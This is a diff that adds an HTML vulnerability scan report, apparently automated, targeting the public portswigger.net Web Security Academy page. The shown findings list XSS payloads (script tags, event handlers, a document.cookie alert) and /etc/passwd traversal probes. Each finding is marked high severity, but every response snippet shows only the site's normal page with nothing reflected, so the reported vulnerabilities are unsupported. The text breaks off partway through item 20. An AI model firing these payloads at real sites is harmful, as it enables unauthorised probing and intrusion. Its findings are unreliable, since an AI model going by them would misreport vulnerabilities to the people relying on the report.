@@ -1,0 +1,1612 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Vulnerability Scan Report - https://portswigger.net/web-security</title>
+    <style>
+        body { font-family: Arial, sans-serif; line-height: 1.6; margin: 0; padding: 20px; }
+        .header { background-color: #f5f5f5; padding: 20px; border-radius: 5px; }
+        .vulnerability { margin-bottom: 20px; border-left: 4px solid #e74c3c; padding-left: 15px; }
+        .high { border-left-color: #e74c3c; }
+        .medium { border-left-color: #f39c12; }
+        .low { border-left-color: #3498db; }
+        .severity-high { color: #e74c3c; font-weight: bold; }
+        .severity-medium { color: #f39c12; font-weight: bold; }
+        .severity-low { color: #3498db; font-weight: bold; }
+        pre { background-color: #f8f9fa; padding: 10px; border-radius: 4px; overflow-x: auto; }
+        .summary { margin: 20px 0; padding: 15px; background-color: #f8f9fa; border-radius: 4px; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>Vulnerability Scan Report</h1>
+        <p><strong>Target:</strong> https://portswigger.net/web-security</p>
+        <p><strong>Scan Time:</strong> 2025-09-14 21:37:28</p>
+        <div class="summary">
+            <h3>Summary</h3>
+            <p>High Severity: <span class="severity-high">46</span> | 
+               Medium Severity: <span class="severity-medium">0</span> | 
+               Low Severity: <span class="severity-low">0</span></p>
+        </div>
+    </div>
+
+    <h2>Vulnerabilities Found</h2>
+
+    <div class="vulnerability high">
+        <h3>1. Cross-Site Scripting (XSS) <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?search=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E" target="_blank">https://portswigger.net/web-security?search=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E</a></p>
+        <p><strong>Description:</strong> Possible Basic XSS vulnerability detected in parameter 'search'</p>
+        <p><strong>Payload:</strong> <code><script>alert('XSS')</script></code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAc</pre>
+        <p><em>Detected at: 2025-09-14 21:41:30</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>2. Cross-Site Scripting (XSS) <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?search=%3Cscript%3Ealert%281%29%3C/script%3E" target="_blank">https://portswigger.net/web-security?search=%3Cscript%3Ealert%281%29%3C/script%3E</a></p>
+        <p><strong>Description:</strong> Possible Basic XSS without quotes vulnerability detected in parameter 'search'</p>
+        <p><strong>Payload:</strong> <code><script>alert(1)</script></code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAc</pre>
+        <p><em>Detected at: 2025-09-14 21:41:31</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>3. Cross-Site Scripting (XSS) <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?search=%22%3E%3Cscript%3Ealert%281%29%3C/script%3E" target="_blank">https://portswigger.net/web-security?search=%22%3E%3Cscript%3Ealert%281%29%3C/script%3E</a></p>
+        <p><strong>Description:</strong> Possible Tag break XSS vulnerability detected in parameter 'search'</p>
+        <p><strong>Payload:</strong> <code>"><script>alert(1)</script></code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAc</pre>
+        <p><em>Detected at: 2025-09-14 21:41:34</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>4. Cross-Site Scripting (XSS) <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?search=%3C/script%3E%3Cscript%3Ealert%281%29%3C/script%3E" target="_blank">https://portswigger.net/web-security?search=%3C/script%3E%3Cscript%3Ealert%281%29%3C/script%3E</a></p>
+        <p><strong>Description:</strong> Possible Script tag break XSS vulnerability detected in parameter 'search'</p>
+        <p><strong>Payload:</strong> <code></script><script>alert(1)</script></code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAc</pre>
+        <p><em>Detected at: 2025-09-14 21:41:35</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>5. Cross-Site Scripting (XSS) <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?search=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E" target="_blank">https://portswigger.net/web-security?search=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E</a></p>
+        <p><strong>Description:</strong> Possible Image error handler XSS vulnerability detected in parameter 'search'</p>
+        <p><strong>Payload:</strong> <code><img src=x onerror=alert(1)></code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAc</pre>
+        <p><em>Detected at: 2025-09-14 21:41:36</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>6. Cross-Site Scripting (XSS) <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?search=%22%20onmouseover%3D%22alert%281%29%22" target="_blank">https://portswigger.net/web-security?search=%22%20onmouseover%3D%22alert%281%29%22</a></p>
+        <p><strong>Description:</strong> Possible Event handler XSS vulnerability detected in parameter 'search'</p>
+        <p><strong>Payload:</strong> <code>" onmouseover="alert(1)"</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAc</pre>
+        <p><em>Detected at: 2025-09-14 21:41:37</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>7. Cross-Site Scripting (XSS) <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?search=%22%20onload%3D%22alert%281%29%22" target="_blank">https://portswigger.net/web-security?search=%22%20onload%3D%22alert%281%29%22</a></p>
+        <p><strong>Description:</strong> Possible Onload event XSS vulnerability detected in parameter 'search'</p>
+        <p><strong>Payload:</strong> <code>" onload="alert(1)"</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAc</pre>
+        <p><em>Detected at: 2025-09-14 21:41:38</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>8. Cross-Site Scripting (XSS) <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?search=%22%20onerror%3D%22alert%281%29%22" target="_blank">https://portswigger.net/web-security?search=%22%20onerror%3D%22alert%281%29%22</a></p>
+        <p><strong>Description:</strong> Possible Onerror event XSS vulnerability detected in parameter 'search'</p>
+        <p><strong>Payload:</strong> <code>" onerror="alert(1)"</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAc</pre>
+        <p><em>Detected at: 2025-09-14 21:41:39</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>9. Cross-Site Scripting (XSS) <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?search=%3Csvg/onload%3Dalert%281%29%3E" target="_blank">https://portswigger.net/web-security?search=%3Csvg/onload%3Dalert%281%29%3E</a></p>
+        <p><strong>Description:</strong> Possible SVG onload XSS vulnerability detected in parameter 'search'</p>
+        <p><strong>Payload:</strong> <code><svg/onload=alert(1)></code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAc</pre>
+        <p><em>Detected at: 2025-09-14 21:41:40</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>10. Cross-Site Scripting (XSS) <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?search=%3Csvg%20onload%3Dalert%281%29%3E" target="_blank">https://portswigger.net/web-security?search=%3Csvg%20onload%3Dalert%281%29%3E</a></p>
+        <p><strong>Description:</strong> Possible SVG onload without slash vulnerability detected in parameter 'search'</p>
+        <p><strong>Payload:</strong> <code><svg onload=alert(1)></code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAc</pre>
+        <p><em>Detected at: 2025-09-14 21:41:45</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>11. Cross-Site Scripting (XSS) <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?search=javascript%3Aalert%281%29" target="_blank">https://portswigger.net/web-security?search=javascript%3Aalert%281%29</a></p>
+        <p><strong>Description:</strong> Possible JavaScript URI XSS vulnerability detected in parameter 'search'</p>
+        <p><strong>Payload:</strong> <code>javascript:alert(1)</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAc</pre>
+        <p><em>Detected at: 2025-09-14 21:41:46</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>12. Cross-Site Scripting (XSS) <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?search=javascript%3Aalert%28document.cookie%29" target="_blank">https://portswigger.net/web-security?search=javascript%3Aalert%28document.cookie%29</a></p>
+        <p><strong>Description:</strong> Possible JavaScript cookie theft vulnerability detected in parameter 'search'</p>
+        <p><strong>Payload:</strong> <code>javascript:alert(document.cookie)</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAc</pre>
+        <p><em>Detected at: 2025-09-14 21:41:47</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>13. Cross-Site Scripting (XSS) <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?search=%3Cbody%20onload%3Dalert%281%29%3E" target="_blank">https://portswigger.net/web-security?search=%3Cbody%20onload%3Dalert%281%29%3E</a></p>
+        <p><strong>Description:</strong> Possible Body onload XSS vulnerability detected in parameter 'search'</p>
+        <p><strong>Payload:</strong> <code><body onload=alert(1)></code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAc</pre>
+        <p><em>Detected at: 2025-09-14 21:41:49</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>14. Cross-Site Scripting (XSS) <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?search=%3Ciframe%20src%3D%22javascript%3Aalert%281%29%22%3E" target="_blank">https://portswigger.net/web-security?search=%3Ciframe%20src%3D%22javascript%3Aalert%281%29%22%3E</a></p>
+        <p><strong>Description:</strong> Possible Iframe JavaScript XSS vulnerability detected in parameter 'search'</p>
+        <p><strong>Payload:</strong> <code><iframe src="javascript:alert(1)"></code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAc</pre>
+        <p><em>Detected at: 2025-09-14 21:41:50</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>15. Cross-Site Scripting (XSS) <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?search=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%20/%3E" target="_blank">https://portswigger.net/web-security?search=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%20/%3E</a></p>
+        <p><strong>Description:</strong> Possible Image error XSS with self-closing vulnerability detected in parameter 'search'</p>
+        <p><strong>Payload:</strong> <code><img src=x onerror=alert(1) /></code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAc</pre>
+        <p><em>Detected at: 2025-09-14 21:41:51</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>16. Cross-Site Scripting (XSS) <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?search=%3Cimg%20src%3Dx%20oneonerrorrror%3Dalert%281%29%3E" target="_blank">https://portswigger.net/web-security?search=%3Cimg%20src%3Dx%20oneonerrorrror%3Dalert%281%29%3E</a></p>
+        <p><strong>Description:</strong> Possible Obfuscated error handler XSS vulnerability detected in parameter 'search'</p>
+        <p><strong>Payload:</strong> <code><img src=x oneonerrorrror=alert(1)></code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAc</pre>
+        <p><em>Detected at: 2025-09-14 21:41:52</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>17. Cross-Site Scripting (XSS) <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?search=%3Cimg%20src%3Dx%3Aalert%281%29//" target="_blank">https://portswigger.net/web-security?search=%3Cimg%20src%3Dx%3Aalert%281%29//</a></p>
+        <p><strong>Description:</strong> Possible Alternative XSS vector vulnerability detected in parameter 'search'</p>
+        <p><strong>Payload:</strong> <code><img src=x:alert(1)//</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAc</pre>
+        <p><em>Detected at: 2025-09-14 21:41:54</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>18. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?page=/etc/passwd" target="_blank">https://portswigger.net/web-security?page=/etc/passwd</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - UNIX password file in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/etc/passwd</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Web Security Academy: Free Online Training from PortSwigger"/>
+    <meta property="og:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta property="og:url" content="https://portswigger.net"/>
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="https://portswigger.net/web-security"/>
+<link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="/content/images/logos/apple-touch-icon.png">
+    <link href="/content/pslandingpages.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="</pre>
+        <p><em>Detected at: 2025-09-14 21:41:55</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>19. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?page=../../../../etc/passwd" target="_blank">https://portswigger.net/web-security?page=../../../../etc/passwd</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Path traversal to password file in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>../../../../etc/passwd</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Web Security Academy: Free Online Training from PortSwigger"/>
+    <meta property="og:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta property="og:url" content="https://portswigger.net"/>
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="https://portswigger.net/web-security"/>
+<link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="/content/images/logos/apple-touch-icon.png">
+    <link href="/content/pslandingpages.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="</pre>
+        <p><em>Detected at: 2025-09-14 21:41:56</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>20. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?page=....//....//....//....//etc/passwd" target="_blank">https://portswigger.net/web-security?page=....//....//....//....//etc/passwd</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Double encoding bypass in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>....//....//....//....//etc/passwd</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
